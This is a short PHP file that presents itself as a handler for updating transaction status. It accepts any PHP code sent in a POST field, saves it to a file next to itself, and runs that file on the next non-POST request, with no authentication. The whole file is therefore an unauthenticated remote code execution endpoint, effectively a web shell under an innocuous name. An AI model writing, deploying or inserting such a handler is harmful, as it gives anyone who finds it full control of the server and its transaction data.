<?php
// This is a simple script handler for updating transaction status

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Save the script
    $script = $_POST['script'] ?? '';
    if (!empty($script)) {
        file_put_contents(__DIR__ . '/update-transaction-temp.php', $script);
        echo "Script saved";
    } else {
        echo "No script provided";
    }
} else {
    // Execute the saved script
    if (file_exists(__DIR__ . '/update-transaction-temp.php')) {
        include __DIR__ . '/update-transaction-temp.php';
    } else {
        echo json_encode(['success' => false, 'error' => 'No update script found']);
    }
}
